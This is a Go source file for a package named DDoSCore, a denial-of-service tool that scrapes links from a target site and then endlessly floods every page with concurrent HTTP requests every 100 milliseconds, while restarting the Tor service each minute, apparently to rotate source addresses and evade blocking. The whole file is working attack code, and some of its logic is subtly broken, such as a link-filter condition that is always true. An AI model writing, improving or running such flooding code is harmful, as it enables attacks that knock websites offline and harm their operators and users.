package DDoSCore

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"regexp"
	"strings"
	"time"
)

type site struct {
	url   string
	pages map[int]string
	rps   int
}

func EmptySite() site {
	return site{}
}

func Site(url string, rps int) site {
	pages := make(map[int]string)
	pages[0] = url
	return site{url, pages, rps}
}

func (this *site) GetUrl() string {
	return this.url
}

func (this *site) GetPages() map[int]string {
	return this.pages
}

func (this *site) GetRPS() int {
	return this.rps
}

func (this *site) SetUrl(url string) {
	this.url = url
}

func (this *site) SetPages(pages map[int]string) {
	this.pages = pages
}

func (this *site) SetRPS(rps int) {
	this.rps = rps
}

func (this *site) AddPage(page string) {
	this.pages[len(this.pages)] = page
}

func (this *site) FindPages() {
	var content string
	response, err := http.Get(this.url)

	if err != nil {
		fmt.Println(err.Error())
	} else {
		defer response.Body.Close()

		bs, err := ioutil.ReadAll(response.Body)

		if err != nil {
			fmt.Println(err.Error())
		} else {
			content = string(bs)
		}
	}

	rgexp := regexp.MustCompile(`<a\s.*?href="(.+?)".*?>(.+?)</a>`)

	res := rgexp.FindAllString(content, -1)

	for _, link := range res {
		var buffer = ""
		hrefPosition := strings.Index(link, "href=\"")
		for pos := hrefPosition + 6; pos != len(link); pos++ {
			if string(link[pos]) == "\"" {
				break
			} else {
				buffer += string(link[pos])
			}
		}

		if buffer[0:4] != "http" || buffer[0:5] != "https" {
			this.AddPage(buffer)
		}

		buffer = ""
	}
}

func (this *site) Start() {
	go this.restarter()
	for {
		for key, _ := range this.pages {
			go this.sendRequest(key)
		}

		time.Sleep(time.Millisecond * 100)
	}
}

func (this *site) sendRequest(index int) {
	response, err := http.Get(this.pages[index])

	if err != nil {
		fmt.Println(err.Error())
	} else {
		defer response.Body.Close()
		fmt.Println("Send request to ", this.url)
	}
}

func (this *site) restarter() {
	for {
		exec.Command("sudo", "service", "tor", "restart").Run()
		time.Sleep(time.Minute)
	}
}
